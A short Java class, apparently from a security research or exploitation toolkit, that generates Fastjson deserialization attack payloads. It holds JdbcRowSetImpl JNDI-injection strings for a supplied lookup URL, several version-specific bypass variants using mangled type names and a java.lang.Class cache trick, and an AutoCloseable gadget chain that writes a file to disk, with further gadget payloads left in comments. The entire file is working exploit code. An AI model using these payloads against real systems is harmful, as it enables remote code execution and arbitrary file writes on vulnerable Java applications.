package org.example;

public class Payload {
    public static String jdbc(String jndi) {
        return String.format("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"%s\",\"autoCommit\":true}", jndi);
    }

    public static String jdbc_bypass25(String jndi) {
        return String.format("{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"%s\",\"autoCommit\":true}", jndi);
    }

    public static String jdbc_bypass42(String jndi) {
        return String.format("{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"%s\",\"autoCommit\":true}", jndi);
    }


    public static String jdbc_bypass43(String jndi) {
        return String.format("{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"%s\",\"autoCommit\":true}", jndi);

    }

    public static String jdbc_bypass47(String jndi) {
        return String.format("{\"a\": {\"@type\": \"java.lang.Class\", \"val\": \"Lcom.sun.rowset.JdbcRowSetImpl;\"}, \"b\": {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"%s\", \"autoCommit\": true}}", jndi);
    }

    public static String jdbc_bypass68(String jndi) {
        return "{" +
                "    '@type':\"java.lang.AutoCloseable\"," +
                "    '@type':'sun.rmi.server.MarshalOutputStream'," +
                "    'out':" +
                "    {" +
                "        '@type':'java.util.zip.InflaterOutputStream'," +
                "        'out':" +
                "        {" +
                "           '@type':'java.io.FileOutputStream'," +
                "           'file':'D:/tmpfile'," +
                "           'append':false" +
                "        }," +
                "        'infl':" +
                "        {" +
                "            'input':{'array':'eJxLLE5JTCkGAAh5AnE=','limit':14}" +
                "        }," +
                "        'bufLen':100" +
                "    }," +
                "    'protocolVersion':1" +
                "}";


        /*return "{\n" +
                "    '@type':\"java.lang.AutoCloseable\",\n" +
                "    '@type':'java.io.FileWriter',\n" +
                "    'file':'D:/nonexist',\n" +
                "    'append':false\n" +
                "}";
*/
        //return "{'@type':\"java.lang.Exception\",'@type':\"org.example.CustomException\",'var1':'D:/rifffile','var2':'thisisthecontent'}";
        //return "{'@type':\"java.lang.AutoCloseable\",'@type':\"java.lang.AutoCloseable\"}";
        //return "{'x':{'@type':\"java.lang.Exception\",'@type':\"javax.lang.model.element.UnknownElementException\",'e':'ssss','parameter':{'@type':\"java.net.URL\",'val':'http://127.0.0.1:8888/asdf'}},'y':{'$ref':'$x.argument.contentType'}}";
    }
}
